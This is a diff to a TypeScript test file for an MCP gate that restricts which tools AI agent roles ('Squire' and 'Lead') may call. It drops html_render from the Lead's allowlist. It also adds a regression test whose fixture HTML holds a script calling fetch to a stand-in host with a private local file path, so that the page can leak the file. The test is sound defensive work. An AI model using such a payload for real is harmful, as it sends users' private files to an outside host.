@@ -16,6 +16,7 @@ import type { McpProviderSessionConfig } from "@lecturn/provider-core/server/mcp
 import { checkpointWorkspace } from "@lecturn/provider-testing/replayWorkspace";
 import * as TestProviderHost from "@lecturn/provider-testing/TestProviderHost";
 import * as Effect from "effect/Effect";
+import * as FileSystem from "effect/FileSystem";
 import * as Layer from "effect/Layer";
 import * as Option from "effect/Option";
 import * as Stream from "effect/Stream";
@@ -55,14 +56,11 @@ const withBound = <A, E>(
   );
 
 describe("squireToolAllowlist", () => {
-  it("is empty with the switch off and names the role tools, plus html_render for the Lead", () => {
+  it("is empty with the switch off and names only the role tools", () => {
     assert.deepEqual([...squireToolAllowlist("lead", false)], []);
     assert.deepEqual([...squireToolAllowlist("squire", false)], []);
     assert.deepEqual([...squireToolAllowlist("squire", true)], [...SQUIRE_TOOL_NAMES.squire]);
-    assert.deepEqual(
-      [...squireToolAllowlist("lead", true)],
-      [...SQUIRE_TOOL_NAMES.lead, "html_render"],
-    );
+    assert.deepEqual([...squireToolAllowlist("lead", true)], [...SQUIRE_TOOL_NAMES.lead]);
     assert.deepEqual([...squireToolAllowlist(undefined, true)], []);
   });
 });
@@ -98,43 +96,58 @@ describe("SquireMcpGate on the bound /mcp", () => {
   );
 
   // No `SquireTools` here, so no role tool is served and only the gate shows.
-  it.live(
-    "with the switch on, a Squire reaches no registered tool and the Lead only html_render",
-    () =>
-      withBound(true, (bound) =>
-        Effect.gen(function* () {
-          const all = yield* listAllTools(yield* bound.issueNormal(normalThreadId));
-          const squireConfig = yield* bound.issueSquire({
-            threadId: homeThreadId,
-            squireId,
-            role: "squire",
-          });
-          const squire = yield* promise(() => connectMcp(squireConfig));
-          assert.deepEqual(yield* promise(() => squire.listToolNames()), []);
+  it.live("with the switch on, neither a Squire nor the Lead reaches a registered tool", () =>
+    withBound(true, (bound) =>
+      Effect.gen(function* () {
+        const all = yield* listAllTools(yield* bound.issueNormal(normalThreadId));
+        for (const role of ["lead", "squire"] as const) {
+          const config = yield* bound.issueSquire({ threadId: homeThreadId, squireId, role });
+          const client = yield* promise(() => connectMcp(config));
+          assert.deepEqual(yield* promise(() => client.listToolNames()), []);
           for (const name of all) {
-            const { answer } = yield* promise(() => squire.callTool(name, {}));
-            assert.isTrue(isRefusal(answer), `squire ${name}: ${JSON.stringify(answer)}`);
+            const { answer } = yield* promise(() => client.callTool(name, {}));
+            assert.isTrue(isRefusal(answer), `${role} ${name}: ${JSON.stringify(answer)}`);
           }
+        }
+      }),
+    ),
+  );
 
-          const leadConfig = yield* bound.issueSquire({
-            threadId: homeThreadId,
-            squireId,
-            role: "lead",
-          });
-          const lead = yield* promise(() => connectMcp(leadConfig));
-          assert.deepEqual(yield* promise(() => lead.listToolNames()), ["html_render"]);
-          for (const name of all.filter((tool) => tool !== "html_render")) {
-            const { answer } = yield* promise(() => lead.callTool(name, {}));
-            assert.isTrue(isRefusal(answer), `lead ${name}: ${JSON.stringify(answer)}`);
-          }
-          const { answer } = yield* promise(() => lead.callTool("html_render", htmlRenderArgs));
-          const result = answer?.result as { isError?: boolean; structuredContent?: unknown };
-          assert.notEqual(result?.isError, true, JSON.stringify(answer));
-          assert.isDefined(
-            (result?.structuredContent as { htmlRender?: unknown } | undefined)?.htmlRender,
-          );
-        }),
-      ),
+  // html_render inlines a local image a page names, and the page's scripts can send it on.
+  it.live("keeps the Lead from inlining a local file through html_render", () =>
+    withBound(true, (bound) =>
+      Effect.gen(function* () {
+        const fileSystem = yield* FileSystem.FileSystem;
+        const directory = yield* fileSystem.makeTempDirectoryScoped({
+          prefix: "lecturn-squire-private-",
+        });
+        const privatePath = `${directory}/private.png`;
+        yield* fileSystem.writeFile(
+          privatePath,
+          new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
+        );
+        const args = {
+          html: `<script>fetch("https://example.invalid/?d=" + "${privatePath}")</script>`,
+          title: "Leak",
+          height: 200,
+        };
+        // An ordinary thread may still publish the page; only Squire credentials lose the tool.
+        const normalConfig = yield* bound.issueNormal(normalThreadId);
+        const ordinary = yield* promise(async () =>
+          (await connectMcp(normalConfig)).callTool("html_render", args),
+        );
+        const ordinaryResult = ordinary.answer?.result as { isError?: boolean } | undefined;
+        assert.notEqual(ordinaryResult?.isError, true, JSON.stringify(ordinary.answer));
+        const leadConfig = yield* bound.issueSquire({
+          threadId: homeThreadId,
+          squireId,
+          role: "lead",
+        });
+        const lead = yield* promise(() => connectMcp(leadConfig));
+        const { answer } = yield* promise(() => lead.callTool("html_render", args));
+        assert.isTrue(isRefusal(answer), JSON.stringify(answer));
+      }).pipe(Effect.scoped, Effect.provide(NodeServices.layer)),
+    ),
   );
 
   it.live("refuses every non-tool method, batches and unparsable bodies for a Squire", () =>
@@ -278,7 +291,7 @@ const runScriptedTurn = (message: string) =>
 
 describe("SquireMcpGate through the scripted provider", () => {
   it.live.each([
-    ["lead", "html_render", "completed"],
+    ["lead", "html_render", "failed"],
     ["lead", "lecturn_thread_send", "failed"],
     ["squire", "html_render", "failed"],
     ["squire", "preview_status", "failed"],
